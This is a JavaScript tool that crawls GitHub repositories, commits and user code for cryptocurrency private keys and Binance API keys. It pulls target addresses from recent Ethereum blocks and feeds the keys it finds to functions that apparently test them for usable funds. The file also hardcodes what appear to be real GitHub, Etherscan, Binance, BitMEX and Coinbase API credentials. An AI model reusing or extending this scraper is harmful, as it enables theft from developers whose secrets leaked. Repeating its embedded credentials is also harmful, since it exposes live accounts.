const {Octokit} = require("@octokit/rest")
const {parseForPrivateKeys} = require("./parseForPrivateKeys")
const ethers2 = require("ethers")
const {testPrivateKeys} = require("./testPrivateKeys")
const {testBinanceKeys} = require("./testBinanceKeys")
const {parseForBinanceKeys} = require('./parseForBinanceKeys')
const Web3 = require("web3")
const Promise = require("bluebird")
const { throttling } = require("@octokit/plugin-throttling");
const { retry } = require("@octokit/plugin-retry");
const names = require('./names.json')
const gitApiKey = "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"
//const gitApiKey = "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"
const etherscanApiKey = "KIP9EMNW2G9Y23TPCS21H6JGD6I9I2WW7T"
const ccxt = require("ccxt")
const BINANCE_API_KEY="3mAq1SOXEmkiPoTUMXW2zBeEZlbq51WeaWbdcccwwDDXORFVFiW9dJ1Gay3uCU1E"
const BINANCE_API_KEY_SECRET="tbUiyZ94l0zpYOlKs3eO1dvLNMOSbOb2T1T0eT0I1eogH9Fh8Htvli05eZ1iDvra"
const etherscanAPI = require("etherscan-api").init(etherscanApiKey)
const BITMEX_API_KEY = "EeE092m3lwJism5mAFc4plfX"
const BITMEX_SECRET = "kgRLOsB7QOfauIyyNj5VOvPQ8ueLCuWWxwXTAI4ABcqqEMqk"
const COINBASE_KEY = "cTgYvXpaksr5fFgr"
const COINBASE_SECRET = "Css2cMN9kTjPNh2XvuHLM9HrdVcX3ty5"
//const exchange = new ccxt.coinbase({apiKey: COINBASE_KEY, secret: COINBASE_SECRET})

//exchange.fetchBalance().then(console.log)
let MyOcto = Octokit.plugin(
 throttling,
  retry
)

 const octo = new MyOcto({
  auth: gitApiKey,
  throttle: {
    onRateLimit: (retryAfter, options) => {
     // console.log("rate limited", options)
      if(options.request.retryCount < 5) {
        octo.log.info('retrying after ${retryAfter} seconds!')
        return true
      }
    },
    onSecondaryRateLimit: (retryAfter, options, octokit) => {
      // does not retry, only logs a warning
      octokit.log.warn(
        `Secondary quota detected for request ${options.method} ${options.url}`
      );
    },
  }
})

const startingAddresses = []
const getBlock = async () => {
  return await etherscanAPI.proxy.eth_blockNumber()
}

const handleCommitFiles = async files => {
  return Promise.each(files, async file => {
	 
	try {

	  let content = await octo.request(`GET ${file.contents_url}`)
	 
	 
          let utfContent = Buffer.from(content.data.content, 'base64').toString('utf-8')
	  //console.log(utfContent)
	  let keys = parseForPrivateKeys(utfContent)
                           let binanceKeys = await parseForBinanceKeys(utfContent)
                           console.log('binance keys in commit file', binanceKeys)
                           console.log("potential keys in commit file", keys.length, "repo:", file.repository.html_url,"file:", file.filename)
		testPrivateKeys(keys)
                     testBinanceKeys(binanceKeys)
	}
	catch(err) {
		console.log(err)

	}
  })
}

const handleCodeFiles = async files => {
   return Promise.each(files, async result => {
	// console.log('getContent called wiith', result)
                   try {
                     let content = await octo.rest.repos.getContent({

                       owner: result.repository.owner.login,
                       repo: result.repository.name,
                       path: result.path
                     })
		     console.log('parsing', result.html_url, "for private keys and and keys to binance")
		    //console.log('content before converted to utf-8', content)
                    const codeFile = Buffer.from(content.data.content, "base64").toString("utf-8")
                    //console.log(codeFile)
                           let keys = parseForPrivateKeys(codeFile)
                           let binanceKeys = await parseForBinanceKeys(codeFile)
                           //console.log('binance keys', binanceKeys)
                           //console.log("potential keys", keys.length, "repo:", result.repository.full_name, "file:", result.name)
			  // console.log(keys)
                     testPrivateKeys(keys)
                     testBinanceKeys(binanceKeys)
                   }
                   catch(err) {console.log(err)}

                })
}


const searchReposForPrivKeys = async (query, page) => {
    let initialRepositories = await octo.rest.search.repos({q: query, per_page: 100, page, sort: "updated"})
   console.log("total results on github ", initialRepositories.data.total_count)
	console.log('current query', query)
	console.log('current page', page)
	//csonsole.log(initialRepositories.data.totalCount)
	if(initialRepositories.data.items.length > 0) {
	 return Promise.each(initialRepositories.data.items, async repo => {
                let binanceQuery=  "repo:"+repo.full_name + " " + "binance"
		let codeSearchQuery = "repo:"+repo.full_name + " " + "priv"
                let codeResults = await octo.rest.search.code({q:codeSearchQuery})
		 console.log(repo.full_name, repo.html_url, "info")
		 console.log("-------------start-------------------")
		console.log("search results for 'private key' in", repo.full_name, repo.html_url,  codeResults.data.items.length)
		let binanceResults = await octo.rest.search.code({q: binanceQuery})
		 console.log('results for a binance search in', repo.full_name, repo.html_url, binanceResults.data.items.length)
		 console.log("------------end--------------")
		 let commitsQuery = "repo:"+repo.full_name + " " + ".env"
		 console.log("fetching commits now for", repo.html_url)
		 let commits = await octo.rest.search.commits({q: commitsQuery})
		 console.log("got commits for repo", repo.full_name, commits.data.items.length)
		 let commitFiles = []
		 Promise.each(commits.data.items, async commit => {
	           let commitData = await octo.request(`GET ${commit.url}`)
	           //console.log("got commit files", commitData.data.files)
	           commitData.data.files.forEach(file => commitFiles.push({...commit, ...file}))
		   return handleCommitFiles(commitFiles)
		 }).then(() => {
	            console.log("final commits", commitFiles.length)
                     let totalResults = [...binanceResults.data.items, ...codeResults.data.items]
                    return handleCodeFiles(totalResults)
		 })
		
	})
	}



}
const searchForPrivKeysViaEtherscan = async (address, page) => {
       const blockNumber = await etherscanAPI.proxy.eth_blockNumber()
  const block = await etherscanAPI.proxy.eth_getBlockByNumber(blockNumber.result)
	let transactions = block.result.transactions
	let addresses = new Set(transactions.map(item => [item.from, item.to]).reduce((a,b)=> [...a,...b]))
	addresses = Array.from(addresses)

  return Promise.each(addresses, async address => {
         let query = 'priv '+ address
      setTimeout(() => {
          octo.rest.search.code({q:query, order:"asc", sort: "indexed", page, per_page:100}).then(res => {
         let items = res.data.items
            console.log(address, items.length)
         return Promise.each(items, async item=> {
		//console.log(item)
           try {
            const content = await octo.rest.git.getBlob({
              owner: item.repository.owner.login,
              repo: item.repository.name,
              file_sha: item.sha
            })
            //console.log(content)
            const codeFile = Buffer.from(content.data.content, "base64").toString("utf-8")
            //console.log(codeFile)
            // console.log("keys")
            let keys = parseForPrivateKeys(codeFile)
            //console.log(keys)
          //  console.log("---------")
            testPrivateKeys(keys)
          }
          catch(err) {
            console.log(err)
          }

         })
	  })
       }, 50)
    })
  }

const searchProfilesForPrivateKeys = async (page, name, per_page) => {
  let apiCalls = 0
  if(!name) {
    return
  }
  octo.rest.search.users({q:name, order:"asc", page, per_page}).then(res => {
    apiCalls += 1
    let profiles = res.data.items
   // console.log(profiles)
    let queryForProfile = "web3"
    let queries = profiles.map(profile =>{
      let query = {q: "User: " + profile.login + " " + queryForProfile}
      return query
    })

      //{q:"User:" + profile.login, queryProfileFor,  per_page:1, page}))
    //console.log(queries[0])
    Promise.each(queries, async query => {
      apiCalls += 1
     // console.log(query)
     let results = await octo.rest.search.code(query)
      let codeSnippets = results.data.items
      if(codeSnippets.length !== 0) {
         console.log("parsing 30 code files for private key", codeSnippets.length)
      Promise.each(codeSnippets, async snippet => {
        apiCalls += 1
        //console.log("api calls ", apiCalls)//console.log(Object.keys(snippet))
        const content = await octo.rest.git.getBlob({
             owner: snippet.repository.owner.login,
             repo: snippet.repository.name,
             file_sha: snippet.sha
           })
           //console.log(content)
           const codeFile = Buffer.from(content.data.content, "base64").toString("utf-8")
        //console.log(codeFile)
        let keys = parseForPrivateKeys(codeFile)
       //console.log(keys)
        testPrivateKeys(keys)
           //searchProfilesForPrivateKeys(page+=1, name, per_page)
      })
    }
      else {
           //ssearchProfilesForPrivateKeys(page+=1, name, per_page)
      }

    })
  }).catch(console.log)
}

  const searchForPrivKeysViaGithub = async (page) => {

    let query = ''
      setTimeout(() => {
          octo.rest.search.code({q:query, order:"asc", sort: "indexed", page, per_page:30}).then(async res => {
         let items = res.data.items
           console.log(items.length)
            Promise.each(items , async item => {
                const content = await octo.rest.git.getBlob({
             owner: item.repository.owner.login,
             repo: item.repository.name,
             file_sha: item.sha
           })
              //console.log(content)
            const codeFile = Buffer.from(content.data.content, "base64").toString("utf-8")
              //console.log(codeFile)
              let keys = parseForPrivateKeys(codeFile)
        // console.log(keys)
         //  console.log("---------")
           testPrivateKeys(keys)
              searchForPrivKeysViaGithub(page+=1)
        })


      }).catch(err => console.log(err))
         //searchForPrivKeysViaGithub(page+=1)
       }, 50)

  }


//searchPrivKeysViaEtherscan()
//ssearchForPrivKeysViaEtherscan()
//page, name, per_page
//console.log(process.argv)
//searchProfilesForPrivateKeys(process.argv[2], process.argv[3], process.argv[4])

for(let i=0; i< 6; i++) {
 searchReposForPrivKeys(process.argv[2], i) // name, page
}

const ethContractAddress = "0x28c3b043BbccBc646211Af23F7Eaa5eE86F9C70d"

const testAddress = "0xd83eB40979cA0Dabe945E22629A72765dc9A39bD"
//testPrivateKeys(["5990aa4ef390928f140d90a2b4700322d69f4137af404fb9cf7d07356abcecff"])


//searchForPrivKeysViaGithub(1)
//searchReposForPrivKeys(process.argv[2], process.argv[3])


let network = "rinkeby"

//start()
//getBlock().then(console.log)
//console.log("got block number", block)
//ethAPI.account.txList().then(console.log)

//searchProfilesForPrivateKeys(1, 'Harry', 30)
// for(let i=0; i< names.length; i++) {
//   searchProfilesForPrivateKeys(1, names[i])
// }
